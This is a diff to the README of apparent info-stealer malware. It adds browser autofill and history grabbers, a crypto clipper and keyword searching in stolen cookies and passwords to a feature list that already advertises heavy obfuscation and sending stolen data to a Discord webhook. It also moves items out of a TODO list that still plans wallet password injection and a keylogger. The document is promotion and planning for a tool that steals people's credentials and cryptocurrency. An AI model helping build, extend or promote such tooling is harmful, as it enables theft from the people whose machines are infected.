@@ -27,7 +27,11 @@
 - Ultra high quality obfuscation
 - Easy to setup (just modify the "config.js" file)
 - Sends everything to your webhook in beautiful embeds
-- Analyzes the data which was stolen and sends a
+- Analyzes the data which was stolen and sends a zip file to your discord webhook
+- Browser autofill grabber
+- Browser history grabber
+- Crypto clipper
+- Searches for keywords in cookies, passwords, autofill and lists them on the top of the cookie/password/autofill log files
 
 ## Setup:
 - Download the files
@@ -51,11 +55,6 @@ https://www.virustotal.com/gui/file/06d2ab510cfb2716c835897e5b8ea7509e8d4ff24b36
 
 
 ## TODO
-- Crypto clipper
-- Search for keywords in system files (for example "coinbase.com")
-- Browser history grabber
-- Browser autofill grabber
-- Browser credit card grabber
 - Exodus wallet injection (get the password whenever the user logs in the wallet)
 - More grabbers (VPN's, Gaming, Messengers)
 - Keylogger
